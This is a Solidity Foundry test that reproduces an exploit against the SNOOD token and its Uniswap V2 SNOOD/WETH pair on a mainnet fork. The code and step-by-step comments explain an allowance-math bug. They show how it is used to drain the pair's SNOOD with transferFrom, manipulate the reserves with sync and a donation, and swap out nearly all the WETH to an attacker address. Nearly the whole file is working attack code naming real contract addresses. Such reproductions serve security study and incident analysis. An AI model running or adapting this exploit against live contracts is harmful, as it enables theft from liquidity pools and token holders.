// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

interface IUNIPAIR is IERC20 {
    function sync() external;

    function getReserves() external returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract ContractTest is Test {
    IERC20 SNOOD = IERC20(0xD45740aB9ec920bEdBD9BAb2E863519E59731941);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    IUNIPAIR uniLP = IUNIPAIR(0x0F6b0960d2569f505126341085ED7f0342b67DAe);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("http://127.0.0.1:8545", 14_983_660); //fork mainnet at block 14983660
    }

    function testExploit() public {
        // address attacker = vm.addr(1);
        address attacker = 0x180ea08644b123D8A3f0ECcf2a3b45A582075538;
        emit log("before the attack");
        emit log_uint(WETH.balanceOf(attacker));
        assertTrue(WETH.balanceOf(attacker) == 0);

        // EXPLOIT STEP 1: Snapshot the full SNOOD balance held by the Uniswap V2 pair (SNOOD/WETH).
        // This amount (in standard units) will be used both for the drain and the later donation/swap math.
        uint256 balance = SNOOD.balanceOf(address(uniLP));

        // VULNERABILITY: Asymmetric Reflection Math in SchnoodleV9 `_spendAllowance` + `allowance` (ERC777 base)
        // SchnoodleV9Base overrides:
        //   allowance(holder, spender) => _getStandardAmount( super.allowance() )   // reflected_stored / rate
        //   _spendAllowance(owner, spender, amt) => super._spendAllowance( ..., _getStandardAmount(amt) )  // BUG: amt is already STANDARD from caller, so divides AGAIN
        //   _send(...) => super._send( ..., _getReflectedAmount(amt) )  // amt * rate  (full reflected moved)
        //   _approve stores _getReflectedAmount(value)
        // With raw _allowances[pair][caller] == 0 (no approval ever granted), view allowance()=0.
        // transferFrom(pair, this, balance-1) calls _spendAllowance(standard=bal-1) => super( _getStandard(bal-1) ~0 )
        //   => OZ require( current=0 >= ~0 ) passes, then _approve subtracts ~0.
        // Then _send moves the FULL reflected amount (pair's entire internal balance).
        // Impact: Anyone can call transferFrom on ANY holder (who has 0 raw approval) to steal its entire SNOOD balance.
        // Here it drains the Uniswap pair's SNOOD side completely, setting up the price manipulation.
        require(SNOOD.transferFrom(address(uniLP), address(this), balance - 1));

        // EXPLOIT STEP 2: Force the pair to sync its reserves to the post-drain balances.
        // Now pair holds ~0 SNOOD + full WETH => reserve1 collapses to 1 (or tiny), making SNOOD appear extremely expensive.
        uniLP.sync();

        // EXPLOIT STEP 3: Re-donate the stolen SNOOD balance back into the pair.
        // This is required for the constant-product invariant to allow pulling out the WETH in the next swap.
        // (The donation may trigger fee logic because pair is the liquidity token, but enough SNOOD remains.)
        require(SNOOD.transfer(address(uniLP), balance - 1));

        // EXPLOIT STEP 4: Read the manipulated reserves (a=WETH reserve, b~SNOOD=1).
        (uint112 a, uint112 b,) = uniLP.getReserves();

        // EXPLOIT STEP 5: Compute the WETH amountOut using the Uniswap V2 swap formula with 0.3% fee (9970/10000).
        // With b≈1 the denominator is tiny, so amount0Out ≈ almost the entire WETH reserve.
        uint256 amount0Out;
        if (b * 10_000 + (balance - 1) * 9970 == 0) {
            amount0Out = 0;
        } else {
            amount0Out = ((balance - 1) * 9970 * a) / (b * 10_000 + (balance - 1) * 9970);
        }

        // EXPLOIT STEP 6: Call swap to extract all WETH to the attacker EOA.
        // The pair receives the "input" SNOOD from the prior donation, satisfies k invariant internally, and sends WETH out.
        uniLP.swap(amount0Out, 0, attacker, "");

        emit log("WETH after the attack");
        emit log_uint(WETH.balanceOf(attacker));

        assertTrue(WETH.balanceOf(attacker) > 0);
    }
}
